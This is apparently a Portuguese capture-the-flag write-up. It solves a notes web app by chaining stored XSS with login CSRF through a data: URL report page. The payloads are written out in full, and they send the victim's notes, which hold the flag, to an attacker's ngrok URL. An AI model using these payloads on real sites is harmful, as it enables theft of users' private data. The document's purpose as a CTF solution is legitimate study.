1. Abre-se o ngrok no modo HTTP em alguma porta e pega-se seu link http.

2. Cria-se um usuário `teste:teste`

2. Cria-se uma nota com o seguinte conteúdo:

```html
<script>
if(window.location.search.includes('zz'))
	window.location='http://1af7-179-245-128-2.ngrok.io/'+window.open('', 'n').document.body.textContent
</script>
```

3. Cria-se um report com o seguinte conteúdo:

```html
data:text/html,<form action="http://0.0.0.0:8080/login" method=POST id=l target=_blank>
<input type="text" name="username" value="teste"><input type="text" name="password" value="teste">
</form><script>window.open('http://0.0.0.0:8080/notes','n');setTimeout(`l.submit()`,1000);setTimeout(`window.location='http://0.0.0.0:8080/notes?zz'`,1500)</script>
```

O usuário com a flag acessará essa página local, que acessará suas notas (contendo a flag). Depois de 1 segundo, logará com o usuário `teste:teste` em uma outra janela e depois de 1.5 segundo, acessará as notas do usuário `teste:teste` com o parâmetr GET `zz`, que ativa o trigger que rouba o conteúdo da janela com as notas do usuário contendo a flag. Esse conteúdo é enviado para os logs do ngrok.


![](/Screenshots/Pasted%20image%2020220328184317.png)